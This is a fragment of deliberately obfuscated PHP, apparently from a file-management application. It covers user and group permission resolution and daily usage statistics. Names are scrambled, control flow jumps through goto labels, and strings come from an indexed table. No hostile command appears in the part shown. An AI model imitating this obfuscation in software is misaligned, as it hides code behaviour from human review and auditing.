$DÜ³Ï™Š†å->groupPathDisplay($có¼ÃÍ³ù‰); $d†‡Çáø†÷ = array($có¼ÃÍ³ù‰); goto DâãÜœ§£; aóÓ©¡’: } private function groupAuthInfo($E»•³îÔ¯á, $FßÌ îê¾) { $BÎâİø†ğ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B†™¨î«‡Ü = Model($BÎâİø†ğ[484])->getInfo($FßÌ îê¾); return array($BÎâİø†ğ[2327] => intval($E»•³îÔ¯á[$BÎâİø†ğ[401]]), $BÎâİø†ğ[2310] => $E»•³îÔ¯á, $BÎâİø†ğ[2328] => LNG($BÎâİø†ğ[2329]), $BÎâİø†ğ[2319] => array($BÎâİø†ğ[411] => $B†™¨î«‡Ü[$BÎâİø†ğ[28]], $BÎâİø†ğ[75] => KodIO::make($B†™¨î«‡Ü[$BÎâİø†ğ[416]][$BÎâİø†ğ[394]]), $BÎâİø†ğ[2326] => $B†™¨î«‡Ü[$BÎâİø†ğ[489]])); } protected function groupRootAuth($fÎšÜ‡ô¸Ö, $bØ™ÇéÜ = false) { goto FŸáÉØÀ°; b¡Ô«ã®°Û: static $c¥é½ÏĞÀĞ = array(); if (isset($c¥é½ÏĞÀĞ[$d‚Æ¹…ËëÈ])) { return $c¥é½ÏĞÀĞ[$d‚Æ¹…ËëÈ]; } $Eï¼½ó­–Á = Model($DÓ¨’Ëš¹ñ[484])->getInfo($fÎšÜ‡ô¸Ö); goto EÎËµ»¶Îó; FáåååçŸ¨: return $c¥é½ÏĞÀĞ[$d‚Æ¹…ËëÈ]; goto DÌÊãäßˆ; Fê…¬³òÎ: $A¸ìò˜˜å = $C™„”ä´Û ? $this->authMake($C™„”ä´Û, $bØ™ÇéÜ) : !1; $Eô ÎÚáŠ = $A¸ìò˜˜å ? $A¸ìò˜˜å[$DÓ¨’Ëš¹ñ[443]] : !1; $c¥é½ÏĞÀĞ[$d‚Æ¹…ËëÈ] = $Eô ÎÚáŠ ? $Eô ÎÚáŠ : $d£Ğ¡Œğä†; goto FáåååçŸ¨; FŸáÉØÀ°: $DÓ¨’Ëš¹ñ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bØ™ÇéÜ = $bØ™ÇéÜ ? $bØ™ÇéÜ : USER_ID; $d‚Æ¹…ËëÈ = $bØ™ÇéÜ . $DÓ¨’Ëš¹ñ[2330] . $fÎšÜ‡ô¸Ö; goto b¡Ô«ã®°Û; EÎËµ»¶Îó: $Bš¤â¯ àÇ = $this->userGroupList($bØ™ÇéÜ); $d£Ğ¡Œğä† = isset($Bš¤â¯ àÇ[$fÎšÜ‡ô¸Ö]) ? $Bš¤â¯ àÇ[$fÎšÜ‡ô¸Ö][$DÓ¨’Ëš¹ñ[401]] : !1; if ($d£Ğ¡Œğä† && Model($DÓ¨’Ëš¹ñ[2301])->authCheckAction($d£Ğ¡Œğä†[$DÓ¨’Ëš¹ñ[401]], $DÓ¨’Ëš¹ñ[1594])) { $c¥é½ÏĞÀĞ[$d‚Æ¹…ËëÈ] = $d£Ğ¡Œğä†; return $d£Ğ¡Œğä†; } goto FŠ„ÚšŸ•; FŠ„ÚšŸ•: $A¿ƒš½šõò = array($DÓ¨’Ëš¹ñ[394] => $Eï¼½ó­–Á[$DÓ¨’Ëš¹ñ[416]][$DÓ¨’Ëš¹ñ[394]]); $féÇ÷Ù²† = $DÓ¨’Ëš¹ñ[2309]; $C™„”ä´Û = $this->field($féÇ÷Ù²†)->cacheMemory()->where($A¿ƒš½šõò)->select(); goto Fê…¬³òÎ; DÌÊãäßˆ: } public function authOwnerApply($fê™êÛØØ) { goto dæâ÷…éª‡; dæâ÷…éª‡: $e òÂÅÁ™Ê =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($fê™êÛØØ[$e òÂÅÁ™Ê[401]]) || isset($fê™êÛØØ[$e òÂÅÁ™Ê[2331]]) && $fê™êÛØØ[$e òÂÅÁ™Ê[2331]]) { return $fê™êÛØØ; } if (AuthModel::authCheckRoot($fê™êÛØØ[$e òÂÅÁ™Ê[401]][$e òÂÅÁ™Ê[402]])) { return $fê™êÛØØ; } goto eÙæğÚí“õ; föÏƒÕŞâ¦: $fê™êÛØØ[$e òÂÅÁ™Ê[401]][$e òÂÅÁ™Ê[2333]] = Model($e òÂÅÁ™Ê[500])->userListInfo($EâÅ®àçøÎ); return $fê™êÛØØ; goto d‚²‹µß×ˆ; eÙæğÚí“õ: $E¿‹»Û÷ÍÊ = Model($e òÂÅÁ™Ê[1143])->parentLevelArray($fê™êÛØØ[$e òÂÅÁ™Ê[485]]); $E¿‹»Û÷ÍÊ = array_merge(array($fê™êÛØØ[$e òÂÅÁ™Ê[394]]), array_reverse($E¿‹»Û÷ÍÊ)); $BÆµ‡ËÌòÖ = $e òÂÅÁ™Ê[2309]; goto a±ëÏ•İËÖ; a±ëÏ•İËÖ: $E¯†öòÉ—à = array($e òÂÅÁ™Ê[408] => array($e òÂÅÁ™Ê[409], $E¿‹»Û÷ÍÊ)); $B˜Œ²ìß’³ = $this->field($BÆµ‡ËÌòÖ)->where($E¯†öòÉ—à)->select(); $B˜Œ²ìß’³ = array_to_keyvalue_group($B˜Œ²ìß’³, $e òÂÅÁ™Ê[394]); goto aµ‚íïµ˜í; E’÷áİ: if (count($EâÅ®àçøÎ) == 0) { $EâÅ®àçøÎ = $this->authFolderOwnerGroup($fê™êÛØØ[$e òÂÅÁ™Ê[482]]); } $EâÅ®àçøÎ = array_unique($EâÅ®àçøÎ); if (AuthModel::authCheckRoot($fê™êÛØØ[$e òÂÅÁ™Ê[401]][$e òÂÅÁ™Ê[402]])) { $EâÅ®àçøÎ[] = USER_ID; } goto föÏƒÕŞâ¦; aµ‚íïµ˜í: $câô”À÷Ä = array(); $EâÅ®àçøÎ = array(); foreach ($B˜Œ²ìß’³ as $a¢ŠÎ‹ò™† => $báç‘±“) { $a‹ŠØºÍ = $this->authFolderOwnerUser($báç‘±“); $câô”À÷Ä[$a¢ŠÎ‹ò™†] = $a‹ŠØºÍ; $EâÅ®àçøÎ = array_merge($EâÅ®àçøÎ, $a‹ŠØºÍ[$e òÂÅÁ™Ê[560]]); if ($a‹ŠØºÍ[$e òÂÅÁ™Ê[2332]]) { break; } } goto E’÷áİ; d‚²‹µß×ˆ: } private function authFolderOwnerGroup($A›‡’¯Š‹½) { $fÖ˜À–³Ï‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b¢½«Š§ × = Model($fÖ˜À–³Ï‹[2217])->where(array($fÖ˜À–³Ï‹[2138] => $A›‡’¯Š‹½))->select(); $f‘Á«È = array(); if (!$b¢½«Š§ ×) { return $f‘Á«È; } foreach ($b¢½«Š§ × as $DíÀ£·íÉ) { $açó³¼ÖÔğ = $this->authInfo($DíÀ£·íÉ); if (AuthModel::authCheckRoot($açó³¼ÖÔğ[$fÖ˜À–³Ï‹[401]])) { $f‘Á«È[] = $DíÀ£·íÉ[$fÖ˜À–³Ï‹[1465]]; } } return $f‘Á«È; } private function authFolderOwnerUser($bŞëˆë¾ñ®) { $A¢ì«Ñ°œ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eùÒÚî™Î“ = array(); $A¦‘Ó˜é½æ = !1; foreach ($bŞëˆë¾ñ® as $dÄ‚‰¥Œ¢§) { $DÎ÷ƒ‡Î¢Á = $this->authInfo($dÄ‚‰¥Œ¢§); if ($dÄ‚‰¥Œ¢§[$A¢ì«Ñ°œ[482]] == $A¢ì«Ñ°œ[494]) { $A¦‘Ó˜é½æ = !0; } if ($dÄ‚‰¥Œ¢§[$A¢ì«Ñ°œ[396]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($DÎ÷ƒ‡Î¢Á[$A¢ì«Ñ°œ[401]])) { $eùÒÚî™Î“[] = $dÄ‚‰¥Œ¢§[$A¢ì«Ñ°œ[482]]; } } } return array($A¢ì«Ñ°œ[560] => $eùÒÚî™Î“, $A¢ì«Ñ°œ[2332] => $A¦‘Ó˜é½æ); } public function authMake($E“¸ áù†, $b›¯¶¸’Âå = false) { goto a±åø¶¦Ü; B¬¬Öï¾Ãç: $B×âÅ²Î¸« = 0; $a»ì¶™íğ¦ = 0; $f¼„ŠÕ¡×‡ = array($b¬Œ±ïÀí[394] => 0); goto Aİ­÷ßõÈ–; Aİ­÷ßõÈ–: foreach ($E“¸ áù† as $f¼„ŠÕ¡×‡) { $bĞ†°êôºË = $this->authInfo($f¼„ŠÕ¡×‡); $cİ†‘¯£ŠÓ = $f¼„ŠÕ¡×‡[$b¬Œ±ïÀí[482]]; $fø‡ÒÂªí˜ = intval($bĞ†°êôºË[$b¬Œ±ïÀí[401]]); if ($f¼„ŠÕ¡×‡[$b¬Œ±ïÀí[396]] == SourceModel::TYPE_USER && $cİ†‘¯£ŠÓ == $b›¯¶¸’Âå) { $eÉ’é–Ò = !0; $aƒÃÉ¦•Ø = $bĞ†°êôºË; $Dƒ¡©Šé²¥ = $fø‡ÒÂªí˜; } else { if ($f¼„ŠÕ¡×‡[$b¬Œ±ïÀí[396]] == SourceModel::TYPE_GROUP && $this->groupContainUser($cİ†‘¯£ŠÓ, $b›¯¶¸’Âå)) { $aàÕ†äò© = !0; $BÌ¢¡‹ğö = $this->groupStepToUserGroup($cİ†‘¯£ŠÓ, $b›¯¶¸’Âå); if ($BÌ¢¡‹ğö < $dğ¯‹Š•êº) { $dğ¯‹Š•êº = $BÌ¢¡‹ğö; $fùƒŒ”˜Ö¹ = $fø‡ÒÂªí˜; $f·ô”ô«Î¨ = $bĞ†°êôºË; $eÑàùå¯·„ = $cİ†‘¯£ŠÓ; } if ($BÌ¢¡‹ğö == $dğ¯‹Š•êº && $fø‡ÒÂªí˜ >= $fùƒŒ”˜Ö¹) { $fùƒŒ”˜Ö¹ = $fø‡ÒÂªí˜; $f·ô”ô«Î¨ = $bĞ†°êôºË; $eÑàùå¯·„ = $cİ†‘¯£ŠÓ; } } else { if ($cİ†‘¯£ŠÓ == $b¬Œ±ïÀí[494]) { $fƒ•Æ“Ò‹£ = !0; $a»ì¶™íğ¦ = $bĞ†°êôºË; $B×âÅ²Î¸« = $fø‡ÒÂªí˜; } } } } if ($eÉ’é–Ò) { $C¹¥¼÷œâ´ = $Dƒ¡©Šé²¥; $bĞ†°êôºË = $aƒÃÉ¦•Ø; $f¯’Ø©Á”Ÿ = LNG($b¬Œ±ïÀí[2334]); } else { if ($aàÕ†äò©) { $C¹¥¼÷œâ´ = $fùƒŒ”˜Ö¹; $bĞ†°êôºË = $f·ô”ô«Î¨; $Cˆ†Ü”ÅêŠ = Model($b¬Œ±ïÀí[484])->getInfo($eÑàùå¯·„); $f¯’Ø©Á”Ÿ = $b¬Œ±ïÀí[157] . $Cˆ†Ü”ÅêŠ[$b¬Œ±ïÀí[489]] . $b¬Œ±ïÀí[2335] . LNG($b¬Œ±ïÀí[2336]); } else { if ($fƒ•Æ“Ò‹£) { $C¹¥¼÷œâ´ = $B×âÅ²Î¸«; $bĞ†°êôºË = $a»ì¶™íğ¦; $f¯’Ø©Á”Ÿ = LNG($b¬Œ±ïÀí[2306]); } else { $C¹¥¼÷œâ´ = 0; $bĞ†°êôºË = !1; $f¯’Ø©Á”Ÿ = $b¬Œ±ïÀí[33]; } } } $a‹Êµ¦ÈÖÂ = array($b¬Œ±ïÀí[2327] => intval($C¹¥¼÷œâ´), $b¬Œ±ïÀí[2310] => $bĞ†°êôºË, $b¬Œ±ïÀí[2328] => $f¯’Ø©Á”Ÿ, $b¬Œ±ïÀí[2319] => $this->sourceAuthInfo($f¼„ŠÕ¡×‡[$b¬Œ±ïÀí[394]])); goto Dğ¦ôÃ¥‚‰; Dë‚‘õ·Í: $aàÕ†äò© = 0; $fùƒŒ”˜Ö¹ = 0; $f·ô”ô«Î¨ = 0; goto a¨‚Øî…ë; a¨‚Øî…ë: $dğ¯‹Š•êº = 1000; $eÑàùå¯·„ = 0; $fƒ•Æ“Ò‹£ = 0; goto B¬¬Öï¾Ãç; EƒÌ’±…‚Ç: $eÉ’é–Ò = 0; $Dƒ¡©Šé²¥ = 0; $aƒÃÉ¦•Ø = 0; goto Dë‚‘õ·Í; a±åø¶¦Ü: $b¬Œ±ïÀí =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$E“¸ áù†) { return array($b¬Œ±ïÀí[402] => 0, $b¬Œ±ïÀí[443] => !1); } $b›¯¶¸’Âå = $b›¯¶¸’Âå ? $b›¯¶¸’Âå : USER_ID; goto EƒÌ’±…‚Ç; Dğ¦ôÃ¥‚‰: return $a‹Êµ¦ÈÖÂ; goto b”øµ•ñ§â; b”øµ•ñ§â: } private function groupContainUser($C°ÁÇ‹ÎªŒ, $dôÎäÓ“ª = false) { return in_array($C°ÁÇ‹ÎªŒ, $this->userGroupParents($dôÎäÓ“ª)); } private function groupStepToUserGroup($BÒ¾Ú ˜ôé, $cÇŸ‹çñé‡ = false) { goto AŒ´óñ±æ; CÆò•ïÌÓ¯: $CßÀîğó—à = $GLOBALS[$CÑšŒÆ‘Ÿ[6]][$CÑšŒÆ‘Ÿ[84]][$CÑšŒÆ‘Ÿ[2229]] == 1; $a¡‚—æ· Ë = $CßÀîğó—à ? 3 : 2; foreach ($d‰Äö‚³È as $d¥ŞöØÕÂ«) { if ($d¥ŞöØÕÂ«[$CÑšŒÆ‘Ÿ[2138]] == $BÒ¾Ú ˜ôé) { return 0; } $fæ™×Ñìó¼ = explode($CÑšŒÆ‘Ÿ[47], trim($d¥ŞöØÕÂ«[$CÑšŒÆ‘Ÿ[485]], $CÑšŒÆ‘Ÿ[47])); if ($fæ™×Ñìó¼[0] == $CÑšŒÆ‘Ÿ[494] && count($fæ™×Ñìó¼) > $a¡‚—æ· Ë) { $E¯±¼Œâá = array_reverse(array_slice($fæ™×Ñìó¼, $a¡‚—æ· Ë)); $Bªö¢Ï¶È» = array_search($BÒ¾Ú ˜ôé, $E¯±¼Œâá); if ($Bªö¢Ï¶È» !== !1 && $Bªö¢Ï¶È» + 1 <= $dŒÛ’†„ù²) { $dŒÛ’†„ù² = $Bªö¢Ï¶È» + 1; } } } goto F»¸ÀğˆÏ„; AŒ´óñ±æ: $CÑšŒÆ‘Ÿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $d‰Äö‚³È = $this->userGroupList($cÇŸ‹çñé‡); $dŒÛ’†„ù² = 1000; goto CÆò•ïÌÓ¯; F»¸ÀğˆÏ„: return $dŒÛ’†„ù²; goto a·†Çªç¡†; a·†Çªç¡†: } private function userGroupList($Dè‡ËŸº¼¦ = false) { $B„Ğİ„Ùß =& $_SERVER[åÌÛ»ô¢‚ö™]; static $e¯ôùÔ“£Ó = array(); if (isset($e¯ôùÔ“£Ó[$Dè‡ËŸº¼¦])) { return $e¯ôùÔ“£Ó[$Dè‡ËŸº¼¦]; } $a©½ƒ‰„Á = Model($B„Ğİ„Ùß[503])->getInfo($Dè‡ËŸº¼¦); $e¯ôùÔ“£Ó[$Dè‡ËŸº¼¦] = array_to_keyvalue($a©½ƒ‰„Á[$B„Ğİ„Ùß[2307]], $B„Ğİ„Ùß[2138]); return $e¯ôùÔ“£Ó[$Dè‡ËŸº¼¦]; } public function userGroupParents($eá‡Ìò÷‘) { goto cò¶ËµËÌ; Fê ƒ†ƒ®Ñ: if (isset($F˜÷ĞŠ®Óš[$eá‡Ìò÷‘])) { return $F˜÷ĞŠ®Óš[$eá‡Ìò÷‘]; } $EŸØÔ½ä = $this->userGroupList($eá‡Ìò÷‘); $f íçñ¦§Ô = array(); goto Aª“µ¼Áİ ; cò¶ËµËÌ: $F‹«ÈÈŒ‚ =& $_SERVER[åÌÛ»ô¢‚ö™]; static $F˜÷ĞŠ®Óš = array(); $eá‡Ìò÷‘ = $eá‡Ìò÷‘ ? $eá‡Ìò÷‘ : USER_ID; goto Fê ƒ†ƒ®Ñ; AÃÍŞÔõ¥ª: $F˜÷ĞŠ®Óš[$eá‡Ìò÷‘] = array_unique($f íçñ¦§Ô); return $F˜÷ĞŠ®Óš[$eá‡Ìò÷‘]; goto fÙ«…Ê¨ù‘; Aª“µ¼Áİ : $DÎ¨Ì‡èÅˆ = $GLOBALS[$F‹«ÈÈŒ‚[6]][$F‹«ÈÈŒ‚[84]][$F‹«ÈÈŒ‚[2229]] == 1; $Cì‰†Û‡É¸ = $DÎ¨Ì‡èÅˆ ? 3 : 2; foreach ($EŸØÔ½ä as $e¬á¾¼–óğ) { $cÙï¢ÄÜÔà = array($e¬á¾¼–óğ[$F‹«ÈÈŒ‚[2138]]); $bè¶‘Ìß“é = explode($F‹«ÈÈŒ‚[47], trim($e¬á¾¼–óğ[$F‹«ÈÈŒ‚[485]], $F‹«ÈÈŒ‚[47])); if ($bè¶‘Ìß“é[0] == $F‹«ÈÈŒ‚[494] && count($bè¶‘Ìß“é) > $Cì‰†Û‡É¸) { $E÷Ü®ë…¶ = array_slice($bè¶‘Ìß“é, $Cì‰†Û‡É¸); $cÙï¢ÄÜÔà = array_merge($cÙï¢ÄÜÔà, array_reverse($E÷Ü®ë…¶)); } $f íçñ¦§Ô = array_merge($f íçñ¦§Ô, $cÙï¢ÄÜÔà); } goto AÃÍŞÔõ¥ª; fÙ«…Ê¨ù‘: } public function authTargetInfoMake($eò«ÆÔ­Ÿ¥) { goto d¨ìò©ìĞ˜; AºÉÍô£ø: foreach ($eò«ÆÔ­Ÿ¥ as $a²ğ©İ«) { if ($a²ğ©İ«[$döİ‡Œ±·˜[396]] == SourceModel::TYPE_USER) { $cùç”´ãÊÀ[] = intval($a²ğ©İ«[$döİ‡Œ±·˜[482]]); } else { if ($a²ğ©İ«[$döİ‡Œ±·˜[396]] == SourceModel::TYPE_GROUP) { $DË£—¾Éé[] = intval($a²ğ©İ«[$döİ‡Œ±·˜[482]]); } } } if ($cùç”´ãÊÀ) { $cùç”´ãÊÀ = Model($döİ‡Œ±·˜[500])->userListInfo($cùç”´ãÊÀ); } if ($DË£—¾Éé) { $AÏ­šŠÜèÒ = array($döİ‡Œ±·˜[2215] => array($döİ‡Œ±·˜[409], $DË£—¾Éé)); $DË£—¾Éé = Model($döİ‡Œ±·˜[484])->field($döİ‡Œ±·˜[2228])->where($AÏ­šŠÜèÒ)->select(); $DË£—¾Éé = array_to_keyvalue($DË£—¾Éé, $döİ‡Œ±·˜[2138]); } goto b§áƒ“¤õÇ; b§áƒ“¤õÇ: return array($döİ‡Œ±·˜[2337] => $cùç”´ãÊÀ, $döİ‡Œ±·˜[2338] => $DË£—¾Éé); goto d¦„ƒ¤Éêê; d¨ìò©ìĞ˜: $döİ‡Œ±·˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cùç”´ãÊÀ = array(); $DË£—¾Éé = array(); goto AºÉÍô£ø; d¦„ƒ¤Éêê: } public function authInfo($a¹æÛ¡›à­) { $Fê”†Úçƒç =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($a¹æÛ¡›à­[$Fê”†Úçƒç[2282]]) { $CÆ¸Ä«† = Model($Fê”†Úçƒç[2301])->listData($a¹æÛ¡›à­[$Fê”†Úçƒç[2282]]); if (!$CÆ¸Ä«†) { return !1; $AÂïäìì« = Model($Fê”†Úçƒç[2301])->listData(); $e¸ã™ÉİŸá = array_filter_by_field($AÂïäìì«, $Fê”†Úçƒç[401], $Fê”†Úçƒç[494]); return $e¸ã™ÉİŸá; } $Bªõ­‹Í = array_field_key($CÆ¸Ä«†, array($Fê”†Úçƒç[392], $Fê”†Úçƒç[28], $Fê”†Úçƒç[401], $Fê”†Úçƒç[2158], $Fê”†Úçƒç[2160])); $Bªõ­‹Í[$Fê”†Úçƒç[2339]] = $a¹æÛ¡›à­; return $Bªõ­‹Í; } else { return array($Fê”†Úçƒç[410] => 0, $Fê”†Úçƒç[2144] => $a¹æÛ¡›à­[$Fê”†Úçƒç[2283]], $Fê”†Úçƒç[411] => $Fê”†Úçƒç[33], $Fê”†Úçƒç[2158] => $Fê”†Úçƒç[2340]); } } } goto E°­¾‹µÔ¡; A´à÷ÕŞƒÏ: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($aîİÁÀ®Œà) { $a‡æÖ·æ˜‘ =& $_SERVER[åÌÛ»ô¢‚ö™]; $eì‰îÌ¨¹ = array($a‡æÖ·æ˜‘[560] => array($a‡æÖ·æ˜‘[29] => $a‡æÖ·æ˜‘[2063], $a‡æÖ·æ˜‘[276] => array($a‡æÖ·æ˜‘[228], $a‡æÖ·æ˜‘[727], $a‡æÖ·æ˜‘[2064], $a‡æÖ·æ˜‘[2065])), $a‡æÖ·æ˜‘[2066] => array($a‡æÖ·æ˜‘[29] => $a‡æÖ·æ˜‘[2067], $a‡æÖ·æ˜‘[276] => array($a‡æÖ·æ˜‘[228], $a‡æÖ·æ˜‘[725], $a‡æÖ·æ˜‘[2068], $a‡æÖ·æ˜‘[2069], $a‡æÖ·æ˜‘[2070]))); if (!isset($eì‰îÌ¨¹[$aîİÁÀ®Œà])) { return !1; } $this->optionType = $eì‰îÌ¨¹[$aîİÁÀ®Œà][$a‡æÖ·æ˜‘[29]]; $this->field = $eì‰îÌ¨¹[$aîİÁÀ®Œà][$a‡æÖ·æ˜‘[276]]; return !0; } public function listData($AÇöÊõ‡Ô¯ = false, $EœµŒä»Öç = "\155\x6f\x64\151\x66\171\x54\151\155\145", $cğÔ¦ßÜƒ¾ = false) { return parent::listData($AÇöÊõ‡Ô¯, $EœµŒä»Öç, $cğÔ¦ßÜƒ¾); } public function trendList($f¦¸ÕÙÑòÏ) { goto aîØ—¡àÏÌ; f†ŠÉ‹ôò»: foreach ($fÇ†…±‰„­ as $CÉÊ‰ÉÜ—) { $this->{$D§‚ŞÈÁšÏ}($CÉÊ‰ÉÜ—); } return $this->listData(); goto Fˆ±‡¸òŞ; E³¿¨¨³Ñ¾: if (!isset($DÀ¬Õ±½Ò™)) { $B¤¢„“ßÍ = $f¦¸ÕÙÑòÏ == $E—å‘ÏÛšÊ[560] ? $E—å‘ÏÛšÊ[503] : $E—å‘ÏÛšÊ[778]; $DÀ¬Õ±½Ò™ = Model($B¤¢„“ßÍ)->min($E—å‘ÏÛšÊ[200]); } $D§‚ŞÈÁšÏ = $E—å‘ÏÛšÊ[2073] . ucfirst($f¦¸ÕÙÑòÏ); $fÇ†…±‰„­ = $this->dateList($DÀ¬Õ±½Ò™); goto f†ŠÉ‹ôò»; aîØ—¡àÏÌ: $E—å‘ÏÛšÊ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BïáæÒÇ˜† = $this->listData(); if ($BïáæÒÇ˜†) { $c¢‡Üï•® = end($BïáæÒÇ˜†); $CÉÊ‰ÉÜ— = date($E—å‘ÏÛšÊ[2071], strtotime($E—å‘ÏÛšÊ[2072])); if ($c¢‡Üï•®[$E—å‘ÏÛšÊ[228]] == $CÉÊ‰ÉÜ—) { return $BïáæÒÇ˜†; } $DÀ¬Õ±½Ò™ = strtotime($c¢‡Üï•®[$E—å‘ÏÛšÊ[228]]); } goto E³¿¨¨³Ñ¾; Fˆ±‡¸òŞ: } private function dateList($aßœƒ››©) { $bˆ½ïŞ¶á¥ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cĞŒ¡Å¯í = $aßœƒ››©; $bğ®„İÀÍö = strtotime($bˆ½ïŞ¶á¥[2072]); $Aã¢òŸ½çğ = array(); while ($cĞŒ¡Å¯í <= $bğ®„İÀÍö) { $Aã¢òŸ½çğ[] = date($bˆ½ïŞ¶á¥[2071], $cĞŒ¡Å¯í); $cĞŒ¡Å¯í = strtotime($bˆ½ïŞ¶á¥[2074], $cĞŒ¡Å¯í); } return $Aã¢òŸ½çğ; } public function _recordUser($a²à×—‹‘ = '') { goto EäëëÒŠ‰—; F’õçÌÃ¾: $bºÆŒÙŠÄš = array($Fİ¦¿•‹´[228] => $a²à×—‹‘, $Fİ¦¿•‹´[727] => (int) $aëø®İºé­, $Fİ¦¿•‹´[2064] => (int) $F«‰­î’ƒ, $Fİ¦¿•‹´[2065] => (int) $cƒ¾¢†Ê¥); return $this->insert($bºÆŒÙŠÄš); goto f‚°¥ù÷’; dÑ®ğÚ˜­: $EŒö·˜…êï = array($Fİ¦¿•‹´[200] => array($Fİ¦¿•‹´[948], $c´÷„Õ„“‹)); $aëø®İºé­ = Model($Fİ¦¿•‹´[503])->where($EŒö·˜…êï)->count($Fİ¦¿•‹´[1465]); $EŒö·˜…êï[$Fİ¦¿•‹´[200]] = array($Fİ¦¿•‹´[336], array($dßÃù¸Üâ¶, $c´÷„Õ„“‹)); goto AêÃ¾Ë‘„Ö; AêÃ¾Ë‘„Ö: $F«‰­î’ƒ = Model($Fİ¦¿•‹´[503])->where($EŒö·˜…êï)->count($Fİ¦¿•‹´[1465]); $EŒö·˜…êï[$Fİ¦¿•‹´[29]] = $Fİ¦¿•‹´[2077]; $cƒ¾¢†Ê¥ = Model($Fİ¦¿•‹´[2078])->where($EŒö·˜…êï)->count($Fİ¦¿•‹´[2079]); goto F’õçÌÃ¾; EäëëÒŠ‰—: $Fİ¦¿•‹´ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dßÃù¸Üâ¶ = strtotime(date($Fİ¦¿•‹´[2075], strtotime($a²à×—‹‘))); $c´÷„Õ„“‹ = strtotime(date($Fİ¦¿•‹´[2076], strtotime($a²à×—‹‘))); goto dÑ®ğÚ˜­; f‚°¥ù÷’: } public function _recordStore($dï¤ÔÙ†ñ“ = '') { goto AŠˆˆÄÄ÷İ; a”ì¼Ó·©Î: $d“ŞÎ‡Š¨¿ = Model($c¥æè¿àÖÙ[778])->where($f‡‡Öêñ©)->sum($c¥æè¿àÖÙ[77]); $D»œ¸‰ˆŒ = array($c¥æè¿àÖÙ[228] => $dï¤ÔÙ†ñ“, $c¥æè¿àÖÙ[725] => (int) $AÁ¨êÕËâç, $c¥æè¿àÖÙ[2068] => (int) $A‘·òé ‹, $c¥æè¿àÖÙ[2069] => (int) $Aë¨Ö¬à³, $c¥æè¿àÖÙ[2070] => (int) $d“ŞÎ‡Š¨¿); return $this->insert($D»œ¸‰ˆŒ); goto eÚÁÃ‹×©†; Dù³¶‰é: $f‡‡Öêñ©[$c¥æè¿àÖÙ[396]] = 1; $Aë¨Ö¬à³ = Model($c¥æè¿àÖÙ[778])->where($f‡‡Öêñ©)->sum($c¥æè¿àÖÙ[77]); $f‡‡Öêñ©[$c¥æè¿àÖÙ[396]] = 2; goto a”ì¼Ó·©Î; A“éòÅ°: $A‘·òé ‹ = Model($c¥æè¿àÖÙ[447])->where($f‡‡Öêñ©)->sum($c¥æè¿àÖÙ[77]); $f‡‡Öêñ©[$c¥æè¿àÖÙ[395]] = 0; $AÁ¨êÕËâç = Model($c¥æè¿àÖÙ[778])->where($f‡‡Öêñ©)->sum($c¥æè¿àÖÙ[77]); goto Dù³¶‰é; AŠˆˆÄÄ÷İ: $c¥æè¿àÖÙ =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÇ­ÔÆÀÖù = strtotime(date($c¥æè¿àÖÙ[2076], strtotime($dï¤ÔÙ†ñ“))); $f‡‡Öêñ© = array($c¥æè¿àÖÙ[200] => array($c¥æè¿àÖÙ[948], $cÇ­ÔÆÀÖù)); goto A“éòÅ°; eÚÁÃ‹×©†: } public function trend($f™ÛÃËò—¢, $cÑªˆ¾‘) { goto F‘‰†ºÄº; F‘‰†ºÄº: $b¢„ƒÍ°Â× =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$this->init($f™ÛÃËò—¢)) { return !1; } $Aîø™º¥“ = $this->trendList($f™ÛÃËò—¢); goto AîÓÙôá•; Aˆõ¹½†¹’: return $aÅø Ã‰îÈ; goto a„›ªÌºíØ; AîÓÙôá•: if ($Aîø™º¥“ && $cÑªˆ¾‘ != $b¢„ƒÍ°Â×[1439]) { $d¡ÅíÁæİ± = $Aîø™º¥“[0][$b¢„ƒÍ°Â×[228]]; $Fˆ¹í°Ò‹ï = $this->validDate($cÑªˆ¾‘, $d¡ÅíÁæİ±); $E¥¼—×å‰Æ = array(); $dêËØİº¨ò = array_to_keyvalue($Aîø™º¥“, $b¢„ƒÍ°Â×[228]); foreach ($Fˆ¹í°Ò‹ï as $Bèç„–™) { if (isset($dêËØİº¨ò[$Bèç„–™])) { $A–Û‚÷µçß = $dêËØİº¨ò[$Bèç„–™]; } else { $A–Û‚÷µçß = end($Aîø™º¥“); $A–Û‚÷µçß[$b¢„ƒÍ°Â×[228]] = $Bèç„–™; if ($f™ÛÃËò—¢ == $b¢„ƒÍ°Â×[560]) { $A–Û‚÷µçß[$b¢„ƒÍ°Â×[2064]] = $A–Û‚÷µçß[$b¢„ƒÍ°Â×[2065]] = 0; } } $E¥¼—×å‰Æ[] = $A–Û‚÷µçß; } $Aîø™º¥“ = $E¥¼—×å‰Æ; } $bÕñ†›Üéê = array($b¢„ƒÍ°Â×[560] => array($b¢„ƒÍ°Â×[727] => LNG($b¢„ƒÍ°Â×[2080]), $b¢„ƒÍ°Â×[2064] => LNG($b¢„ƒÍ°Â×[2081]), $b¢„ƒÍ°Â×[2065] => LNG($b¢„ƒÍ°Â×[2082])), $b¢„ƒÍ°Â×[2066] => array($b¢„ƒÍ°Â×[725] => LNG($b¢„ƒÍ°Â×[2083]), $b¢„ƒÍ°Â×[2068] => LNG($b¢„ƒÍ°Â×[2084]), $b¢„ƒÍ°Â×[2069] => LNG($b¢„ƒÍ°Â×[2085]), $b¢„ƒÍ°Â×[2070] => LNG($b¢„ƒÍ°Â×[2086]))); $dØÊ§Üí‹‰ = array($b¢„ƒÍ°Â×[560] => $b¢„ƒÍ°Â×[2087], $b¢„ƒÍ°Â×[2066] => $b¢„ƒÍ°Â×[77]); goto B´Úõ‰Ê¾; B´Úõ‰Ê¾: if (empty($Aîø™º¥“)) { $Bèç„–™ = 